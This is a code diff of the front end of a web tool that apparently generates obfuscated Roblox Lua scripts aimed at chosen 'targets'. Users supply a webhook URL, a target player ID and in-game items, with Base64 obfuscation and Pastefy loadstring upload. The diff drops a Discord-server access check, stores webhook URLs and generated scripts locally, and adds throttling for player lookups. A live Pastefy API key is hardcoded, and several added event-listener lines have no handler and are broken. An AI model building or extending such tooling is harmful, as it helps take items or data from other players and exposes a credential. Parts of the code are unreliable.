@@ -490,13 +490,11 @@ const DISCORD_GATE_IMAGE_URL = "https://media.giphy.com/media/yHXNK60fSqMLccKpxb
 const DISCORD_CLIENT_ID = "1573116888966496427";
 const DISCORD_REDIRECT_URI = window.location.origin + window.location.pathname;
 const PASTEFY_API_KEY = "V8FT0FE52MIx8k74EYbNWxdmnjSxtSRni5TXjiVUwxm7Sq4I2L7g8NYoKcYj";
-const REQUIRED_GUILD_ID = "1545539307115389090";
-let userInRequiredServer = false;
 
 const I18N = {
-  es:{loginTitle:"WXNAD MOREIRA",loginDesc:"Inicia sesión con tu cuenta de Discord para acceder al generador de scripts.",loginBtn:"Continuar con Discord",logout:"Salir",subtitle:"Generación automática de scripts para tus targets de Roblox",discord:"Únete a nuestro Discord",badge1:"⚡ Generación instantánea",badge2:"🔒 Webhook seguro",badge3:"🎯 Selección precisa",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USER (opcional)",targetId:"🎯 TARGET ID",scriptMode:"MODO DE SCRIPT",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Selecciona brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Selecciona gears...",bases:"🏠 TARGET BASES",selectBases:"Selecciona bases...",all:"Todos",searchBrainrot:"Buscar brainrot...",searchGear:"Buscar gear...",searchBase:"Buscar base...",selectAll:"Seleccionar Todos",deselect:"Deseleccionar",close:"Cerrar",options:"</> Opciones Loadstring",pastefyDesc:"Sube el script a Pastefy y genera un loadstring compacto.",obfuscate:"Ofuscar script",obfuscateDesc:"Ofuscación local en Base64.",genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",genId:"⚠️ INGRESA UN TARGET ID",genServer:"⚠️ DEBES ESTAR EN EL SERVIDOR DE DISCORD",genOk:"✨ GENERAR SCRIPT",generated:"📜 Script generado",copy:"Copiar",selected:"seleccionados"},
-  en:{loginTitle:"WXNAD MOREIRA",loginDesc:"Sign in with your Discord account to access the script generator.",loginBtn:"Continue with Discord",logout:"Logout",subtitle:"Automated script generation for your Roblox targets",discord:"Join our Discord",badge1:"⚡ Instant generation",badge2:"🔒 Secure webhook",badge3:"🎯 Precise target selection",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USER (opcional)",targetId:"🎯 TARGET ID",scriptMode:"SCRIPT MODE",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Select brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Select gears...",bases:"🏠 TARGET BASES",selectBases:"Select bases...",all:"All",searchBrainrot:"Search brainrot...",searchGear:"Search gear...",searchBase:"Search base...",selectAll:"Select All",deselect:"Deselect",close:"Close",options:"</> Loadstring Options",pastefyDesc:"Upload script to Pastefy and get a compact loadstring.",obfuscate:"Obfuscate script",obfuscateDesc:"Local obfuscation in Base64.",genWarn:"⚠️ SELECT AT LEAST ONE TARGET",genId:"⚠️ ENTER A TARGET ID",genServer:"⚠️ YOU MUST BE IN THE DISCORD SERVER",genOk:"✨ GENERATE SCRIPT",generated:"📜 Generated script",copy:"Copy",selected:"selected"},
-  pt:{loginTitle:"WXNAD MOREIRA",loginDesc:"Entre com sua conta do Discord para acessar o gerador de scripts.",loginBtn:"Continuar com Discord",logout:"Sair",subtitle:"Geração automática de scripts para seus targets do Roblox",discord:"Entre no nosso Discord",badge1:"⚡ Geração instantânea",badge2:"🔒 Webhook seguro",badge3:"🎯 Seleção precisa",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USUÁRIO (opcional)",targetId:"🎯 TARGET ID",scriptMode:"MODO DO SCRIPT",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Selecione brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Selecione gears...",bases:"🏠 TARGET BASES",selectBases:"Selecione bases...",all:"Todos",searchBrainrot:"Buscar brainrot...",searchGear:"Buscar gear...",searchBase:"Buscar base...",selectAll:"Selecionar Todos",deselect:"Desmarcar",close:"Fechar",options:"</> Opções Regras",pastefyDesc:"Envie o script para o Pastefy e gere um loadstring compacto.",obfuscate:"Ofuscar script",obfuscateDesc:"Ofusção local em Base64.",genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",genId:"⚠️ INSIRA UM TARGET ID",genServer:"⚠️ VOCÊ DEVE ESTAR NO SERVIDOR DO DISCORD",genOk:"✨ GERAR SCRIPT",generated:"📜 Script gerado",copy:"Copiar",selected:"selecionados"}
+  es:{loginTitle:"WXNAD MOREIRA",loginDesc:"Inicia sesión con tu cuenta de Discord para acceder al generador de scripts.",loginBtn:"Continuar con Discord",logout:"Salir",subtitle:"Generación automática de scripts para tus targets de Roblox",discord:"Únete a nuestro Discord",badge1:"⚡ Generación instantánea",badge2:"🔒 Webhook seguro",badge3:"🎯 Selección precisa",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USER (opcional)",targetId:"🎯 TARGET ID",scriptMode:"MODO DE SCRIPT",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Selecciona brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Selecciona gears...",bases:"🏠 TARGET BASES",selectBases:"Selecciona bases...",all:"Todos",searchBrainrot:"Buscar brainrot...",searchGear:"Buscar gear...",searchBase:"Buscar base...",selectAll:"Seleccionar Todos",deselect:"Deseleccionar",close:"Cerrar",options:"</> Opciones Loadstring",pastefyDesc:"Sube el script a Pastefy y genera un loadstring compacto.",obfuscate:"Ofuscar script",obfuscateDesc:"Ofuscación local en Base64.",genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",genId:"⚠️ INGRESA UN TARGET ID",genOk:"✨ GENERAR SCRIPT",generated:"📜 Script generado",copy:"Copiar",selected:"seleccionados"},
+  en:{loginTitle:"WXNAD MOREIRA",loginDesc:"Sign in with your Discord account to access the script generator.",loginBtn:"Continue with Discord",logout:"Logout",subtitle:"Automated script generation for your Roblox targets",discord:"Join our Discord",badge1:"⚡ Instant generation",badge2:"🔒 Secure webhook",badge3:"🎯 Precise target selection",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USER (opcional)",targetId:"🎯 TARGET ID",scriptMode:"SCRIPT MODE",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Select brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Select gears...",bases:"🏠 TARGET BASES",selectBases:"Select bases...",all:"All",searchBrainrot:"Search brainrot...",searchGear:"Search gear...",searchBase:"Search base...",selectAll:"Select All",deselect:"Deselect",close:"Close",options:"</> Loadstring Options",pastefyDesc:"Upload script to Pastefy and get a compact loadstring.",obfuscate:"Obfuscate script",obfuscateDesc:"Local obfuscation in Base64.",genWarn:"⚠️ SELECT AT LEAST ONE TARGET",genId:"⚠️ ENTER A TARGET ID",genOk:"✨ GENERATE SCRIPT",generated:"📜 Generated script",copy:"Copy",selected:"selected"},
+  pt:{loginTitle:"WXNAD MOREIRA",loginDesc:"Entre com sua conta do Discord para acessar o gerador de scripts.",loginBtn:"Continuar com Discord",logout:"Sair",subtitle:"Geração automática de scripts para seus targets do Roblox",discord:"Entre no nosso Discord",badge1:"⚡ Geração instantânea",badge2:"🔒 Webhook seguro",badge3:"🎯 Seleção precisa",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USUÁRIO (opcional)",targetId:"🎯 TARGET ID",scriptMode:"MODO DO SCRIPT",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Selecione brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Selecione gears...",bases:"🏠 TARGET BASES",selectBases:"Selecione bases...",all:"Todos",searchBrainrot:"Buscar brainrot...",searchGear:"Buscar gear...",searchBase:"Buscar base...",selectAll:"Selecionar Todos",deselect:"Desmarcar",close:"Fechar",options:"</> Opções Regras",pastefyDesc:"Envie o script para o Pastefy e gere um loadstring compacto.",obfuscate:"Ofuscar script",obfuscateDesc:"Ofusção local em Base64.",genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",genId:"⚠️ INSIRA UM TARGET ID",genOk:"✨ GERAR SCRIPT",generated:"📜 Script gerado",copy:"Copiar",selected:"selecionados"}
 };
 const FLAGS={es:"https://flagcdn.com/w80/es.png",en:"https://flagcdn.com/w80/us.png",pt:"https://flagcdn.com/w80/br.png"};
 let currentLang=localStorage.getItem("wxnad_lang")||"es";
@@ -550,11 +548,18 @@ function updateAutoSaveBadge() {
 function saveLoggedUserState() {
   if (!currentDiscordUserId || !autoSaveEnabled) return;
   const state = {
+    webhookUrl: document.getElementById("webhookUrl").value,
     targetUser: document.getElementById("targetUser").value,
     targetId: document.getElementById("targetId").value,
+    scriptMode: scriptMode,
+    customLoader: document.getElementById("customLoader").value,
     brainrots: Array.from(selectedBrainrots),
     gears: Array.from(selectedGears),
-    bases: Array.from(selectedBases)
+    bases: Array.from(selectedBases),
+    togglePastefy: document.getElementById("togglePastefy").checked,
+    toggleObfuscate: document.getElementById("toggleObfuscate").checked,
+    scriptOutput: document.getElementById("scriptOutput").textContent,
+    hasResult: document.getElementById("result").classList.contains("show")
   };
   try {
     localStorage.setItem(getUserStateKey(currentDiscordUserId), JSON.stringify(state));
@@ -582,12 +587,26 @@ function loadLoggedUserState(userId) {
 
   try {
     const state = JSON.parse(raw);
+    document.getElementById("webhookUrl").value = state.webhookUrl || "";
     document.getElementById("targetUser").value = state.targetUser || "";
     document.getElementById("targetId").value = state.targetId || "";
+    document.getElementById("customLoader").value = state.customLoader || "";
+    document.getElementById("togglePastefy").checked = Boolean(state.togglePastefy);
+    document.getElementById("toggleObfuscate").checked = Boolean(state.toggleObfuscate);
 
     selectedBrainrots = new Set(Array.isArray(state.brainrots) ? state.brainrots : []);
     selectedGears = new Set(Array.isArray(state.gears) ? state.gears : []);
     selectedBases = new Set(Array.isArray(state.bases) ? state.bases : []);
+
+    setScriptModeUI(state.scriptMode || "NO-GUI");
+
+    if (state.hasResult && state.scriptOutput) {
+      document.getElementById("scriptOutput").textContent = state.scriptOutput;
+      document.getElementById("result").classList.add("show");
+    } else {
+      document.getElementById("scriptOutput").textContent = "";
+      document.getElementById("result").classList.remove("show");
+    }
 
     renderList("brainrot"); renderTags("brainrot");
     renderList("gears"); renderTags("gears");
@@ -608,24 +627,20 @@ function getDiscordAvatarUrl(user) {
 
 function setAuthenticatedUser(user) {
   localStorage.setItem("wxnad_discord_user", JSON.stringify(user));
-  userInRequiredServer = user && user.inServer === true;
   document.getElementById("userAvatar").src = getDiscordAvatarUrl(user);
   document.getElementById("userName").textContent = user.global_name || user.username;
   document.getElementById("userPill").classList.add("show");
   document.getElementById("discordAuthGate").classList.add("hidden");
   loadLoggedUserState(user.id);
-  updateButtonState();
 }
 
 function logoutDiscord() {
   saveLoggedUserState();
   currentDiscordUserId = null;
-  userInRequiredServer = false;
   document.getElementById("userMenu").classList.remove("open");
   localStorage.removeItem("wxnad_discord_user");
   document.getElementById("userPill").classList.remove("show");
   document.getElementById("discordAuthGate").classList.remove("hidden");
-  updateButtonState();
 }
 
 document.getElementById("userPill").onclick = e => {
@@ -732,7 +747,7 @@ document.getElementById("discordLoginBtn").onclick = () => {
   }
   const state = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2);
   sessionStorage.setItem("discord_oauth_state", state);
-  const authUrl = `https://discord.com/oauth2/authorize?client_id=${encodeURIComponent(DISCORD_CLIENT_ID)}&response_type=code&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&scope=identify%20guilds&state=${encodeURIComponent(state)}`;
+  const authUrl = `https://discord.com/oauth2/authorize?client_id=${encodeURIComponent(DISCORD_CLIENT_ID)}&response_type=code&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&scope=identify&state=${encodeURIComponent(state)}`;
   window.location.href = authUrl;
 };
 
@@ -754,15 +769,7 @@ const BRAINROT_ENTRIES = [
   { name: "Plant Bros", rarity: "Secret", mps: "$300M/s" },
   { name: "Hydra Dragon Cannelloni", rarity: "Secret", mps: "$300M/s" },
   { name: "Dragon Cannelloni", rarity: "Secret", mps: "$250M/s" },
-  { name: "Arca Bros", rarity: "Secret", mps: "$250M/s" },
   { name: "Moby Bros", rarity: "Secret", mps: "$225M/s" },
-  { name: "Puppetmaster", rarity: "Secret", mps: "$177.5M/s" },
-  { name: "Scarino Crowino", rarity: "Secret", mps: "$135M/s" },
-  { name: "Flying Dutchman", rarity: "Secret", mps: "$92.5M/s" },
-  { name: "Scorpi Inferni", rarity: "Secret", mps: "$85M/s" },
-  { name: "Cobra Gelato", rarity: "Secret", mps: "$77.5M/s" },
-  { name: "Jacko Jakat", rarity: "Secret", mps: "$41M/s" },
-  { name: "Spooky kart", rarity: "Secret", mps: "$13M/s" },
   { name: "Love Love Bear", rarity: "Secret", mps: "$225M/s" },
   { name: "Hydra Serpent", rarity: "Secret", mps: "$220M/s" },
   { name: "La Supreme Combinasion", rarity: "Secret", mps: "$200M/s" },
@@ -1127,14 +1134,6 @@ const BRAINROT_IMAGES = {
   "Plant Bros": "https://static.wikia.nocookie.net/stealabr/images/9/9f/Plant_Bros.png/revision/latest?cb=20261004154647",
   "Hydra Dragon Cannelloni": "https://static.wikia.nocookie.net/stealabr/images/e/ee/Hydra_Dragon_Cannelloni.png/revision/latest?cb=20260207220000",
   "Dragon Cannelloni": "https://static.wikia.nocookie.net/stealabr/images/a/a5/Dragon_Cannelloni.png/revision/latest?cb=20260428162417",
-  "Arca Bros": "https://static.wikia.nocookie.net/stealabr/images/8/8e/Arca_Bros.png/revision/latest?cb=20261017213220",
-  "Cobra Gelato": "https://static.wikia.nocookie.net/stealabr/images/2/24/Cobra_Gelato.png/revision/latest?cb=20261017194539",
-  "Spooky kart": "https://cdn.nookazon.com/stealabrainrot/items/4ed683f643fe4da6.png",
-  "Jacko Jakat": "https://static.wikia.nocookie.net/stealabr/images/8/8f/Jacko_Jakat.png/revision/latest?cb=20261031221111",
-  "Scorpi Inferni": "https://static.wikia.nocookie.net/stealabr/images/4/4b/Scorpi_Inferni.png/revision/latest?cb=20261103143623",
-  "Scarino Crowino": "https://static.wikia.nocookie.net/stealabr/images/8/85/Scarino_Crowino.png/revision/latest?cb=20261031201353",
-  "Puppetmaster": "https://static.wikia.nocookie.net/stealabr/images/a/aa/Puppetmaster.png/revision/latest?cb=20261101185932",
-  "Flying Dutchman": "https://static.wikia.nocookie.net/stealabr/images/b/ba/Flying_Dutchman.png/revision/latest?cb=20261010201300",
   "Moby Bros": "https://static.wikia.nocookie.net/stealabr/images/5/5b/Moby_Bros.png/revision/latest?cb=20260711200502",
   "Love Love Bear": "https://static.wikia.nocookie.net/stealabr/images/b/bf/Love_Love_Bear.png/revision/latest?cb=20260417150552",
   "Hydra Serpent": "https://static.wikia.nocookie.net/stealabr/images/8/8c/Hydra_Serpent.png/revision/latest?cb=20260919212453",
@@ -1515,7 +1514,9 @@ let lookupTimer = null;
 let lastAutoFilledId = "";
 let lastQueriedUsername = "";
 let lookupRequestSeq = 0;
+let rateLimitUntil = 0;
 const userIdCache = new Map();
+const negativeCache = new Map(); // usernames not found (avoid spam)
 
 function setLookupStatus(msg, type = "") {
   const el = document.getElementById("lookupStatus");
@@ -1538,11 +1539,23 @@ async function fetchRobloxUserId(username) {
     return userIdCache.get(cacheKey);
   }
 
+  // Evitar reintentos de usuarios no encontrados durante 60s
+  const negUntil = negativeCache.get(cacheKey) || 0;
+  if (Date.now() < negUntil) {
+    return null;
+  }
+
+  // Cooldown global tras un 429
+  if (Date.now() < rateLimitUntil) {
+    return { rateLimited: true };
+  }
+
   try {
     const res = await fetch(
       `https://users.roproxy.com/v1/users/search?keyword=${encodeURIComponent(clean)}&limit=10`
     );
     if (res.status === 429) {
+      rateLimitUntil = Date.now() + 15000; // 15s de pausa
       return { rateLimited: true };
     }
     if (!res.ok) return null;
@@ -1559,6 +1572,8 @@ async function fetchRobloxUserId(username) {
 
     if (result) {
       userIdCache.set(cacheKey, result);
+    } else {
+      negativeCache.set(cacheKey, Date.now() + 60000); // no reintentar 60s
     }
     return result;
   } catch {
@@ -1623,7 +1638,8 @@ async function autoLookupTargetUser(force = false) {
   lastQueriedUsername = normalized;
 
   if (result && result.rateLimited) {
-    setLookupStatus("Límite temporal (429). Espera unos segundos e intenta de nuevo.", "err");
+    const secs = Math.max(1, Math.ceil((rateLimitUntil - Date.now()) / 1000));
+    setLookupStatus(`Límite temporal. Espera ${secs}s e intenta de nuevo.`, "err");
     return;
   }
 
@@ -1672,15 +1688,14 @@ document.getElementById("targetUser").addEventListener("keydown", (e) => {
 
 document.getElementById("targetUser").addEventListener("blur", () => {
   clearTimeout(lookupTimer);
-  lookupTimer = setTimeout(() => autoLookupTargetUser(true), 250);
+  lookupTimer = setTimeout(() => autoLookupTargetUser(true), 600);
 });
 
 function updateButtonState(){
   const targetId=document.getElementById("targetId").value.trim();
   const btn=document.getElementById("generateBtn");
   const hasAny=selectedBrainrots.size||selectedGears.size||selectedBases.size;
-  if(!userInRequiredServer){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genServer");}
-  else if(!hasAny){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genWarn");}
+  if(!hasAny){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genWarn");}
   else if(!targetId){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genId");}
   else{btn.disabled=false;btn.classList.remove("disabled");btn.textContent=t("genOk");}
 }
@@ -1770,6 +1785,11 @@ function renderTags(type){
   });
 }
 
+document.getElementById("webhookUrl").addEventListener("input",);
+document.getElementById("customLoader").addEventListener("input",);
+document.getElementById("togglePastefy").addEventListener("change",);
+document.getElementById("toggleObfuscate").addEventListener("change",);
+
 document.getElementById("targetId").oninput = () => {
   lastAutoFilledId = "";
   updateButtonState();
@@ -1845,11 +1865,6 @@ function formatLuaTable(setObj){
 }
 
 async function generateScript(){
-  if(!userInRequiredServer){
-    showToast(t("genServer"));
-    return;
-  }
-
   const webhookUrl = document.getElementById("webhookUrl").value.trim();
   let targetId = document.getElementById("targetId").value.trim();
   const targetUser = document.getElementById("targetUser").value.trim();
